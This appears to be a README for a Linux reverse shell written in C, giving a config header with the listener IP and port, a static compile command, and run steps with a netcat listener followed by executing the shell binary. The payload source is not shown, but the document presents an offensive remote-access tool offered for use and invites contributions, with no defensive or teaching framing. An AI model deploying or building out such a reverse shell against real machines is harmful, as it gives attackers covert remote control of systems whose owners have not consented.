### For Linux Machines!
<h1 align="center">
	<img src="https://img.icons8.com/ios-filled/344/console.png" width="150px"><br>
    Reverse Shell written in C.
</h1>

### Configuration
Go into `includes/config.h` to change all this.
```c
#pragma once

#define SERVER_IP "127.0.0.1" // Change to your server IP
#define SERVER_PORT 1337 // Changing this is optional
```
### Compiling
```
gcc -static -o reverse_shell main.c
```
### Running
```
[user@linux]$ nc -lvvp 127.0.0.1 1337
-----------------------
[user@linux]$ ./reverse_shell
``` 
### Contributions 🎉
###### If you're interested in contributing simply open a pull request!
